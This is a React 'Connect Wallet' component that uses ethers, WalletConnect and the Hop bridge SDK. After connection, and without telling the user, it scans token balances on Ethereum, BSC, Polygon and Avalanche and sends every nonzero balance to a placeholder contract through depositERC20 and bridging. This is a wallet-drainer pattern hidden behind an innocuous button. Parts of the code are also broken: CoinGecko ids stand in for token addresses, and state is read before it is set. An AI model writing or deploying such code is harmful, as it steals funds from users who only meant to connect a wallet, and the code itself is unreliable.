"use client"; // Marking this component as a Client Component

import { useState } from 'react';
import { ethers } from 'ethers';
import WalletConnectProvider from "@walletconnect/web3-provider";
import axios from 'axios';
import { Hop } from '@hop-protocol/sdk'; // Import the Hop Protocol SDK

const contractAddress = "YOUR_CONTRACT_ADDRESS"; // Replace with your contract address
const hopContractAddress = "YOUR_HOP_CONTRACT_ADDRESS"; // Replace with your Hop contract address

// Define target chains with their IDs
const TARGET_CHAINS = [
  { name: 'Ethereum', chainId: 1 },
  { name: 'Binance Smart Chain', chainId: 56 },
  { name: 'Polygon', chainId: 137 },
  { name: 'Avalanche', chainId: 43114 },
];

// Function to fetch tokens from CoinGecko dynamically
const fetchTokens = async (chainId: number) => {
  try {
    const tokensResponse = await axios.get(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1&sparkline=false`
    );

    return tokensResponse.data.map(token => ({
      address: token.id, // Adjust according to actual token address structure
      symbol: token.symbol,
      chainId
    }));
  } catch (error) {
    console.error("Error fetching tokens:", error);
    return [];
  }
};

export default function ConnectWallet() {
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [tokens, setTokens] = useState<{ [key: string]: any[] }>({});

  const connectWallet = async () => {
    try {
      const provider = new WalletConnectProvider({
        infuraId: "YOUR_INFURA_ID", // Replace with your Infura ID
      });

      await provider.enable();
      const web3Provider = new ethers.providers.Web3Provider(provider);
      const signer = web3Provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);

      // Fetch tokens for each target chain dynamically
      const fetchedTokens: any[] = [];
      for (const chain of TARGET_CHAINS) {
        const tokensOnChain = await fetchTokens(chain.chainId);
        fetchedTokens.push(...tokensOnChain);
      }
      setTokens(fetchedTokens);

      // Automatically check balances and deposit tokens
      await depositAssets(signer);
    } catch (error) {
      console.error("Error connecting to wallet:", error);
    }
  };

  const depositAssets = async (signer: ethers.Signer) => {
    setLoading(true);
    try {
      const deposits: Promise<void>[] = [];
      const hop = new Hop(); // Initialize Hop SDK

      // Iterate through each target chain to check balances
      for (const chain of TARGET_CHAINS) {
        const provider = new ethers.providers.JsonRpcProvider(`https://rpc-url-for-chain-${chain.chainId}`); // Replace with actual RPC URLs
        const signerChain = provider.getSigner(walletAddress);

        // Check balances for each token on the current chain
        const tokensOnChain = tokens.filter(token => token.chainId === chain.chainId);
        for (const token of tokensOnChain) {
          const contract = new ethers.Contract(token.address, ["function balanceOf(address owner) view returns (uint256)"], signerChain);
          const balance = await contract.balanceOf(walletAddress);

          if (balance.gt(0)) {
            console.log(`Detected ${ethers.utils.formatUnits(balance, 18)} ${token.symbol} on ${chain.name}`);

            // Bridge the assets using Hop
            await bridgeAssets(token.address, balance, chain.chainId, signer);
            deposits.push(depositToContract(token.address, balance, signer));
          }
        }
      }

      // Wait for all transactions to complete
      await Promise.all(deposits);
      alert("All deposits and bridges were successful!");
    } catch (error) {
      console.error("Deposit or bridge failed:", error);
      alert("Deposit or bridge failed!");
    } finally {
      setLoading(false);
    }
  };

  const bridgeAssets = async (tokenAddress: string, amount: ethers.BigNumber, toChainId: number, signer: ethers.Signer) => {
    const hop = new Hop();
    const tx = await hop.send(tokenAddress, amount.toString(), {
      from: walletAddress,
      toChainId,
      signer,
    });
    console.log(`Bridging ${ethers.utils.formatUnits(amount, 18)} of ${tokenAddress} to chain ID ${toChainId}`);
    await tx.wait(); // Wait for the transaction to be mined
  };

  const depositToContract = async (tokenAddress: string, amount: ethers.BigNumber, signer: ethers.Signer) => {
    const contract = new ethers.Contract(contractAddress, ["function depositERC20(address tokenAddress, uint256 amount) external"], signer);
    const tx = await contract.depositERC20(tokenAddress, amount);
    console.log(`Depositing ${ethers.utils.formatUnits(amount, 18)} ${tokenAddress} to contract`);
    await tx.wait(); // Wait for the transaction to be mined
  };

  return (
    <div className="wallet-connection">
      {loading ? (
        <div>Loading...</div>
      ) : walletAddress ? (
        <div>
          <div>Connected as: {walletAddress}</div>
        </div>
      ) : (
        <button
          onClick={connectWallet}
          className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
        >
          Connect Wallet
        </button>
      )}
    </div>
  );
}
